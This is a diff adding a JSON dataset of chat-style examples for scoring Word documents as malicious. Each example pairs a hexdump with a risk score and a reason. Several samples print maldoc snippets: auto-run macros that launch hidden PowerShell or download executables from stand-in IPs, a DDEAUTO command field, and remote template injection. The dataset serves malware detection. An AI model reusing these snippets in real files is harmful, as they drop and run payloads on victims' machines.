@@ -1,0 +1,186 @@
+[
+  {
+    "role": "user",
+    "content": "Meta: filetype=docx size=1452B triggers=zip:[Content_Types].xml,zip:word/document.xml,zip:word/styles.xml\n\nHexdump:\n50 4b 03 04 14 00 06 00 08 00 00 00 21 00 62 91 42 3f\n5b 43 6f 6e 74 65 6e 74 5f 54 79 70 65 73 5d 2e 78 6d 6c\n3c 54 79 70 65 73 3e 3c 44 65 66 61 75 6c 74 20 45 78 74\n65 6e 73 69 6f 6e 3d 22 78 6d 6c 22 20 43 6f 6e 74 65 6e\n74 54 79 70 65 3d 22 61 70 70 6c 69 63 61 74 69 6f 6e 2f 78\n6d 6c 22 2f 3e 3c 4f 76 65 72 72 69 64 65 20 50 61 72 74 4e\n61 6d 65 3d 22 2f 77 6f 72 64 2f 64 6f 63 75 6d 65 6e 74 2e\n78 6d 6c 22 2f 3e\n\n[ascii 188B]\nPK..[Content_Types].xml <Types><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/word/document.xml\"/>"
+  },
+  {
+    "role": "assistant",
+    "content": "0.02 – normal DOCX package structure and document XML, no macro, external-template, object, or execution indicators"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=doc size=4096B triggers=ole:WordDocument,ole:SummaryInformation\n\nHexdump:\nd0 cf 11 e0 a1 b1 1a e1 00 00 00 00 00 00 00 00\n3e 00 03 00 fe ff 09 00 06 00 00 00 00 00 00 00\n57 00 6f 00 72 00 64 00 44 00 6f 00 63 00 75 00 6d 00 65 00 6e 00 74 00\n05 00 53 00 75 00 6d 00 6d 00 61 00 72 00 79 00 49 00 6e 00 66 00 6f 00\n4e 00 6f 00 72 00 6d 00 61 00 6c 00 20 00 64 00 6f 00 63 00 75 00 6d 00 65 00 6e 00 74 00\n\n[ascii 96B]\nCompound File Binary Format / WordDocument / SummaryInformation / normal document text"
+  },
+  {
+    "role": "assistant",
+    "content": "0.04 – legacy DOC container with ordinary WordDocument and metadata streams, no VBA or embedded-object indicators"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=docx size=2190B triggers=zip:word/_rels/document.xml.rels,rel:hyperlink\n\nHexdump:\n3c 52 65 6c 61 74 69 6f 6e 73 68 69 70 73 20 78 6d 6c 6e 73 3d\n22 68 74 74 70 3a 2f 2f 73 63 68 65 6d 61 73 2e 6f 70 65 6e\n78 6d 6c 66 6f 72 6d 61 74 73 2e 6f 72 67 2f 70 61 63 6b 61 67\n65 2f 32 30 30 36 2f 72 65 6c 61 74 69 6f 6e 73 68 69 70 73 22\n3e 3c 52 65 6c 61 74 69 6f 6e 73 68 69 70 20 49 64 3d 22 72 49\n64 35 22 20 54 79 70 65 3d 22 68 74 74 70 3a 2f 2f 73 63 68 65\n6d 61 73 2e 6f 70 65 6e 78 6d 6c 66 6f 72 6d 61 74 73 2e 6f 72\n67 2f 6f 66 66 69 63 65 44 6f 63 75 6d 65 6e 74 2f 32 30 30 36\n2f 72 65 6c 61 74 69 6f 6e 73 68 69 70 73 2f 68 79 70 65 72 6c\n69 6e 6b 22 20 54 61 72 67 65 74 3d 22 68 74 74 70 73 3a 2f 2f\n65 78 61 6d 70 6c 65 2e 63 6f 6d 2f 70 6f 6c 69 63 79 22 20 54\n61 72 67 65 74 4d 6f 64 65 3d 22 45 78 74 65 72 6e 61 6c 22 2f 3e"
+  },
+  {
+    "role": "assistant",
+    "content": "0.10 – external hyperlink is common in benign DOCX files; no template injection, macro, DDE, or payload evidence"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=docx size=6320B triggers=zip:word/media/image1.png,zip:word/document.xml,drawing:inline\n\nHexdump:\n50 4b 03 04 14 00 06 00 08 00 00 00 21 00 72 3a 9b 10\n77 6f 72 64 2f 6d 65 64 69 61 2f 69 6d 61 67 65 31 2e 70 6e 67\n89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 00 00 02 58\n00 00 01 2c 08 06 00 00 00 1f 3d cd 96 00 00 20 00 49 44 41 54\n78 9c ec dd 77 58 14 55 df 07 f0 cf cc ee 2e 20 08 0a 2a 62 51\n\n[ascii 92B]\nword/media/image1.png PNG IHDR IDAT normal embedded image stream"
+  },
+  {
+    "role": "assistant",
+    "content": "0.08 – embedded image data and compression are normal Word features; no code-execution or suspicious relationship indicators"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=docx size=1841B triggers=zip:word/settings.xml,settings:attachedTemplate\n\nHexdump:\n3c 77 3a 73 65 74 74 69 6e 67 73 20 78 6d 6c 6e 73 3a 77 3d 22\n68 74 74 70 3a 2f 2f 73 63 68 65 6d 61 73 2e 6f 70 65 6e 78\n6d 6c 66 6f 72 6d 61 74 73 2e 6f 72 67 2f 77 6f 72 64 70 72\n6f 63 65 73 73 69 6e 67 6d 6c 2f 32 30 30 36 2f 6d 61 69 6e\n22 3e 3c 77 3a 61 74 74 61 63 68 65 64 54 65 6d 70 6c 61 74\n65 20 72 3a 69 64 3d 22 72 49 64 31 22 2f 3e 3c 2f 77 3a 73 65\n74 74 69 6e 67 73 3e\n\n[ascii 164B]\n<w:settings><w:attachedTemplate r:id=\"rId1\"/></w:settings>"
+  },
+  {
+    "role": "assistant",
+    "content": "0.35 – attachedTemplate reference is worth checking, but this chunk alone lacks the relationship target or execution payload"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=docx size=2890B triggers=zip:word/settings.xml,rel:attachedTemplate,targetMode:External,url:http\n\nHexdump:\n3c 52 65 6c 61 74 69 6f 6e 73 68 69 70 20 49 64 3d 22 72 49 64\n31 22 20 54 79 70 65 3d 22 68 74 74 70 3a 2f 2f 73 63 68 65\n6d 61 73 2e 6f 70 65 6e 78 6d 6c 66 6f 72 6d 61 74 73 2e 6f\n72 67 2f 6f 66 66 69 63 65 44 6f 63 75 6d 65 6e 74 2f 32 30\n30 36 2f 72 65 6c 61 74 69 6f 6e 73 68 69 70 73 2f 61 74 74\n61 63 68 65 64 54 65 6d 70 6c 61 74 65 22 20 54 61 72 67 65\n74 3d 22 68 74 74 70 3a 2f 2f 31 39 32 2e 30 2e 32 2e 31 30\n2f 74 65 6d 70 6c 61 74 65 2e 64 6f 74 6d 22 20 54 61 72 67\n65 74 4d 6f 64 65 3d 22 45 78 74 65 72 6e 61 6c 22 2f 3e\n\n[ascii 232B]\nRelationship Type=attachedTemplate Target=\"http://192.0.2.10/template.dotm\" TargetMode=\"External\""
+  },
+  {
+    "role": "assistant",
+    "content": "0.88 – external attachedTemplate to remote DOTM is a common template-injection/maldoc indicator"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=docm size=15240B triggers=zip:word/vbaProject.bin,ole:VBA,macro:present\n\nHexdump:\n50 4b 03 04 14 00 06 00 08 00 00 00 21 00 44 22 10 8a\n77 6f 72 64 2f 76 62 61 50 72 6f 6a 65 63 74 2e 62 69 6e\nd0 cf 11 e0 a1 b1 1a e1 00 00 00 00 00 00 00 00\n56 00 42 00 41 00 2f 00 54 00 68 00 69 00 73 00 44 00 6f 00\n63 00 75 00 6d 00 65 00 6e 00 74 00 00 00 56 00 42 00 41 00\n2f 00 4d 00 6f 00 64 00 75 00 6c 00 65 00 31 00\n\n[ascii 96B]\nword/vbaProject.bin VBA/ThisDocument VBA/Module1"
+  },
+  {
+    "role": "assistant",
+    "content": "0.38 – VBA project exists, which raises risk, but no auto-exec or suspicious API/download keywords are shown"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=docx size=11680B triggers=extension:docx,zip:word/vbaProject.bin,content-type:macroEnabled\n\nHexdump:\n50 4b 03 04 14 00 06 00 08 00 00 00 21 00 44 22 10 8a\n77 6f 72 64 2f 76 62 61 50 72 6f 6a 65 63 74 2e 62 69 6e\n61 70 70 6c 69 63 61 74 69 6f 6e 2f 76 6e 64 2e 6d 73 2d 6f\n66 66 69 63 65 2e 76 62 61 50 72 6f 6a 65 63 74 00 6d 61 63\n72 6f 45 6e 61 62 6c 65 64 2e 31 32\n\n[ascii 128B]\nword/vbaProject.bin application/vnd.ms-office.vbaProject macroEnabled.12"
+  },
+  {
+    "role": "assistant",
+    "content": "0.70 – macro project inside a file labeled DOCX is suspicious because normal DOCX should not carry VBA macro parts"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=doc size=23840B triggers=ole:VBA,macro:autoexec,kw:AutoOpen,kw:Document_Open\n\nHexdump:\n41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20\n22 54 68 69 73 44 6f 63 75 6d 65 6e 74 22 0d 0a 50 72 69\n76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f\n70 65 6e 28 29 0d 0a 20 20 43 61 6c 6c 20 41 75 74 6f 4f\n70 65 6e 0d 0a 45 6e 64 20 53 75 62 0d 0a 53 75 62 20 41\n75 74 6f 4f 70 65 6e 28 29 0d 0a 20 20 4d 73 67 42 6f 78\n20 22 48 65 6c 6c 6f 22 0d 0a 45 6e 64 20 53 75 62"
+  },
+  {
+    "role": "assistant",
+    "content": "0.55 – auto-executing Word macro is risky, but this slice shows only benign message-box behavior and no payload action"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=doc size=34210B triggers=ole:VBA,macro:autoexec,kw:AutoOpen,kw:WScript.Shell,kw:powershell\n\nHexdump:\n53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 0d 0a 20 20 44\n69 6d 20 73 20 41 73 20 4f 62 6a 65 63 74 0d 0a 20 20 53\n65 74 20 73 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74\n28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 0d 0a\n20 20 73 2e 52 75 6e 20 22 70 6f 77 65 72 73 68 65 6c 6c\n20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 48 69 64 64 65\n6e 20 2d 45 6e 63 6f 64 65 64 43 6f 6d 6d 61 6e 64 20 58\n58 58 58 22 2c 20 30 0d 0a 45 6e 64 20 53 75 62\n\n[ascii 200B]\nSub AutoOpen() Set s = CreateObject(\"WScript.Shell\") s.Run \"powershell -WindowStyle Hidden -EncodedCommand XXXX\", 0 End Sub"
+  },
+  {
+    "role": "assistant",
+    "content": "0.97 – AutoOpen launches hidden PowerShell through WScript.Shell, a very common malicious Office macro pattern"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=doc size=40192B triggers=ole:VBA,macro:autoexec,kw:Document_Open,kw:MSXML2.XMLHTTP,kw:ADODB.Stream\n\nHexdump:\n50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e\n74 5f 4f 70 65 6e 28 29 0d 0a 20 20 53 65 74 20 78 20\n3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 4d 53\n58 4d 4c 32 2e 58 4d 4c 48 54 54 50 22 29 0d 0a 20 20 53\n65 74 20 61 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74\n28 22 41 44 4f 44 42 2e 53 74 72 65 61 6d 22 29 0d 0a 20\n20 78 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74\n70 3a 2f 2f 31 39 32 2e 30 2e 32 2e 35 2f 75 70 64 61 74\n65 2e 65 78 65 22 2c 20 46 61 6c 73 65\n\n[ascii 260B]\nDocument_Open CreateObject(\"MSXML2.XMLHTTP\") CreateObject(\"ADODB.Stream\") GET http://192.0.2.5/update.exe"
+  },
+  {
+    "role": "assistant",
+    "content": "0.98 – auto-open macro downloads an executable using XMLHTTP and ADODB.Stream, a classic Office dropper pattern"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=doc size=28740B triggers=ole:VBA,macro:autoexec,kw:URLDownloadToFile,kw:WinExec\n\nHexdump:\n44 65 63 6c 61 72 65 20 50 74 72 53 61 66 65 20 46 75 6e\n63 74 69 6f 6e 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f\n46 69 6c 65 41 20 4c 69 62 20 22 75 72 6c 6d 6f 6e 22 0d\n0a 44 65 63 6c 61 72 65 20 50 74 72 53 61 66 65 20 46 75\n6e 63 74 69 6f 6e 20 57 69 6e 45 78 65 63 20 4c 69 62 20\n22 6b 65 72 6e 65 6c 33 32 22 0d 0a 53 75 62 20 41 75 74\n6f 4f 70 65 6e 28 29 0d 0a 20 20 55 52 4c 44 6f 77 6e\n6c 6f 61 64 54 6f 46 69 6c 65 41 20 30 2c 20 22 68 74 74\n70 3a 2f 2f 31 39 32 2e 30 2e 32 2e 32 30 2f 61 2e 65\n78 65 22 2c 20 22 25 54 45 4d 50 25 5c 61 2e 65 78 65 22\n\n[ascii 270B]\nDeclare URLDownloadToFileA Lib \"urlmon\" Declare WinExec Lib \"kernel32\" AutoOpen download a.exe to %TEMP%"
+  },
+  {
+    "role": "assistant",
+    "content": "0.96 – auto-exec macro declares download and execution APIs, indicating a likely downloader/dropper"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=doc size=31522B triggers=ole:VBA,obfuscation:Chr,obfuscation:StrReverse,kw:CreateObject\n\nHexdump:\n53 75 62 20 4d 61 63 72 6f 31 28 29 0d 0a 20 20 61 20 3d\n20 43 68 72 28 38 37 29 20 26 20 43 68 72 28 38 33 29 20\n26 20 43 68 72 28 39 39 29 20 26 20 43 68 72 28 31 31 34\n29 20 26 20 43 68 72 28 31 30 35 29 20 26 20 43 68 72\n28 31 31 32 29 20 26 20 43 68 72 28 31 31 36 29 0d 0a 20\n20 62 20 3d 20 53 74 72 52 65 76 65 72 73 65 28 22 6c 6c\n65 68 53 2e 74 70 69 72 63 53 57 22 29 0d 0a 20 20 53 65\n74 20 6f 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28\n62 29 0d 0a 45 6e 64 20 53 75 62"
+  },
+  {
+    "role": "assistant",
+    "content": "0.63 – VBA uses string obfuscation and CreateObject, suspicious but lower confidence without auto-exec or payload behavior"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=doc size=35810B triggers=ole:VBA,macro:autoexec,obfuscation:Chr,obfuscation:Base64,kw:Shell\n\nHexdump:\n53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29\n0d 0a 20 20 64 20 3d 20 22 61 48 52 30 63 44 6f 76 4c 7a\n45 35 4d 69 34 77 4c 6a 49 75 4e 54 41 76 63 43 35 6c 65\n47 55 3d 22 0d 0a 20 20 63 20 3d 20 43 68 72 28 63 6c 29\n20 26 20 43 68 72 28 63 6d 29 20 26 20 22 2e 65 78 65 22\n0d 0a 20 20 53 68 65 6c 6c 20 63 2c 20 76 62 48 69 64 65\n0d 0a 45 6e 64 20 53 75 62\n\n[ascii 180B]\nDocument_Open base64-looking URL string, Chr concatenation, Shell ..., vbHide"
+  },
+  {
+    "role": "assistant",
+    "content": "0.86 – auto-open macro combines obfuscated strings, base64-like data, hidden execution, and Shell call"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=docx size=5170B triggers=field:DDEAUTO,kw:cmd.exe,kw:powershell\n\nHexdump:\n7b 20 44 44 45 41 55 54 4f 20 63 6d 64 20 22 2f 63 20 70\n6f 77 65 72 73 68 65 6c 6c 20 2d 6e 6f 70 20 2d 77 20 68\n69 64 64 65 6e 20 2d 65 6e 63 20 58 58 58 58 22 20 7d\n3c 77 3a 69 6e 73 74 72 54 65 78 74 3e 44 44 45 41 55 54\n4f 20 63 6d 64 20 2f 63 20 70 6f 77 65 72 73 68 65 6c 6c\n3c 2f 77 3a 69 6e 73 74 72 54 65 78 74 3e\n\n[ascii 160B]\n{ DDEAUTO cmd \"/c powershell -nop -w hidden -enc XXXX\" }"
+  },
+  {
+    "role": "assistant",
+    "content": "0.95 – DDEAUTO field invokes cmd and hidden PowerShell, a well-known macro-less malicious document technique"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=doc size=46100B triggers=ole:ObjectPool,ole:Package,embedded:EXE,magic:MZ\n\nHexdump:\n4f 00 62 00 6a 00 65 00 63 00 74 00 50 00 6f 00 6f 00 6c 00\n2f 00 5f 00 31 00 32 00 33 00 34 00 35 00 36 00 37 00 38 00\n2f 00 01 00 4f 00 6c 00 65 00 31 00 30 00 4e 00 61 00 74 00\n69 00 76 00 65 00 00 00 50 61 63 6b 61 67 65 00 66 69 6c 65\n6e 61 6d 65 2e 65 78 65 00 4d 5a 90 00 03 00 00 00 04 00 00\n00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00\n\n[ascii 148B]\nObjectPool Package filename.exe MZ PE header"
+  },
+  {
+    "role": "assistant",
+    "content": "0.93 – embedded OLE package contains an EXE/MZ header, strongly suggesting a payload or dropper attachment"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=doc size=22120B triggers=ole:Equation.3,ole:ObjectPool,exploit-surface:OLE2Link\n\nHexdump:\n4f 00 62 00 6a 00 65 00 63 00 74 00 50 00 6f 00 6f 00 6c 00\n2f 00 45 00 71 00 75 00 61 00 74 00 69 00 6f 00 6e 00 2e 00\n33 00 2f 00 4f 00 6c 00 65 00 00 00 45 71 75 61 74 69 6f 6e\n2e 33 00 4f 4c 45 32 4c 69 6e 6b 00 43 4f 4d 50 4f 55 4e 44\n46 49 4c 45 00 00 00 20 20 20 20 01 00 00 00 ff ff ff ff\n\n[ascii 116B]\nObjectPool Equation.3 OLE2Link COMPOUNDFILE"
+  },
+  {
+    "role": "assistant",
+    "content": "0.66 – unusual embedded Equation/OLE object touches a known exploit surface, but no payload or exploit shellcode is visible here"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=doc size=51400B triggers=exploit:heap-spray,kw:VirtualAlloc,kw:kernel32,large:NOP-sled\n\nHexdump:\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90\n75 6e 65 73 63 61 70 65 28 22 25 75 30 63 30 63 25 75 30\n63 30 63 25 75 30 63 30 63 25 75 30 63 30 63 22 29 3b 0d\n0a 56 69 72 74 75 61 6c 41 6c 6c 6f 63 00 6b 65 72 6e 65\n6c 33 32 00 57 69 6e 45 78 65 63 00 68 74 74 70 3a 2f 2f\n31 39 32 2e 30 2e 32 2e 39 2f 70 61 79 6c 6f 61 64 00\n\n[ascii 176B]\nNOP sled, unescape heap-spray pattern, VirtualAlloc, kernel32, WinExec, URL-like payload string"
+  },
+  {
+    "role": "assistant",
+    "content": "0.94 – heap-spray style data plus Windows execution APIs and payload URL are strong exploit/maldoc indicators"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=docx size=7300B triggers=zip:customXml/item1.xml,zip:docProps/core.xml\n\nHexdump:\n3c 64 73 3a 64 61 74 61 53 74 6f 72 65 49 74 65 6d 20 64 73\n3a 69 74 65 6d 49 44 3d 22 7b 37 46 41 42 43 44 45 2d 31\n32 33 34 2d 34 35 36 37 2d 38 39 30 41 2d 45 58 41 4d 50\n4c 45 7d 22 3e 3c 73 63 68 65 6d 61 52 65 66 73 2f 3e 3c\n2f 64 73 3a 64 61 74 61 53 74 6f 72 65 49 74 65 6d 3e 0d\n0a 3c 64 63 3a 74 69 74 6c 65 3e 51 75 61 72 74 65 72 6c\n79 20 52 65 70 6f 72 74 3c 2f 64 63 3a 74 69 74 6c 65 3e"
+  },
+  {
+    "role": "assistant",
+    "content": "0.06 – custom XML and document properties are normal DOCX components with no execution or external-load indicators"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=doc size=98200B triggers=encryption:office,streams:EncryptedPackage\n\nHexdump:\nd0 cf 11 e0 a1 b1 1a e1 00 00 00 00 00 00 00 00\n45 00 6e 00 63 00 72 00 79 00 70 00 74 00 65 00 64 00 50 00\n61 00 63 00 6b 00 61 00 67 00 65 00 00 00 45 00 6e 00 63 00\n72 00 79 00 70 00 74 00 69 00 6f 00 6e 00 49 00 6e 00 66 00\n6f 00 00 00 3c d4 e8 8a 5a 93 22 f8 07 bc 18 71 9a 00 6d 55\n93 ad 73 8f f2 40 88 51 1d 5a 24 cc 3b 7e 01 39\n\n[ascii 92B]\nEncryptedPackage EncryptionInfo high-entropy encrypted payload"
+  },
+  {
+    "role": "assistant",
+    "content": "0.30 – encrypted Office package blocks inspection and raises uncertainty, but encryption alone is not proof of malware"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=docm size=21020B triggers=ole:VBA,macro:present,lure:EnableContent\n\nHexdump:\n45 4e 41 42 4c 45 20 45 44 49 54 49 4e 47 20 54 4f 20 56\n49 45 57 20 54 48 49 53 20 44 4f 43 55 4d 45 4e 54 0d 0a\n45 6e 61 62 6c 65 20 43 6f 6e 74 65 6e 74 20 74 6f 20 76\n69 65 77 20 74 68 65 20 70 72 6f 74 65 63 74 65 64 20 64\n6f 63 75 6d 65 6e 74 2e 0d 0a 77 6f 72 64 2f 76 62 61 50\n72 6f 6a 65 63 74 2e 62 69 6e\n\n[ascii 144B]\nENABLE EDITING TO VIEW THIS DOCUMENT Enable Content to view the protected document. word/vbaProject.bin"
+  },
+  {
+    "role": "assistant",
+    "content": "0.72 – macro-enabled document contains an Enable Content lure, a common maldoc social-engineering pattern"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=docx size=2680B triggers=zip:word/_rels/document.xml.rels,rel:oleObject,targetMode:Internal\n\nHexdump:\n3c 52 65 6c 61 74 69 6f 6e 73 68 69 70 20 49 64 3d 22 72 49\n64 39 22 20 54 79 70 65 3d 22 68 74 74 70 3a 2f 2f 73 63\n68 65 6d 61 73 2e 6f 70 65 6e 78 6d 6c 66 6f 72 6d 61 74\n73 2e 6f 72 67 2f 6f 66 66 69 63 65 44 6f 63 75 6d 65 6e\n74 2f 32 30 30 36 2f 72 65 6c 61 74 69 6f 6e 73 68 69 70\n73 2f 6f 6c 65 4f 62 6a 65 63 74 22 20 54 61 72 67 65 74\n3d 22 65 6d 62 65 64 64 69 6e 67 73 2f 6f 6c 65 4f 62 6a\n65 63 74 31 2e 62 69 6e 22 2f 3e\n\n[ascii 210B]\nRelationship Type=oleObject Target=\"embeddings/oleObject1.bin\""
+  },
+  {
+    "role": "assistant",
+    "content": "0.40 – embedded OLE object deserves scrutiny, but this relationship alone does not show exploit content or executable payload"
+  },
+  {
+    "role": "user",
+    "content": "Meta: filetype=docx size=9100B triggers=zip:word/embeddings/oleObject1.bin,ole:Package,magic:MZ\n\nHexdump:\n50 4b 03 04 14 00 06 00 08 00 00 00 21 00 77 6f 72 64 2f\n65 6d 62 65 64 64 69 6e 67 73 2f 6f 6c 65 4f 62 6a 65 63\n74 31 2e 62 69 6e 00 50 61 63 6b 61 67 65 00 70 61 79 6c\n6f 61 64 2e 65 78 65 00 4d 5a 90 00 03 00 00 00 04 00 00\n00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00 50 45\n00 00 4c 01 03 00\n\n[ascii 132B]\nword/embeddings/oleObject1.bin Package payload.exe MZ PE"
+  },
+  {
+    "role": "assistant",
+    "content": "0.94 – DOCX embeds an OLE package with an executable PE payload, strongly malicious or at least highly unsafe"
+  }
+]
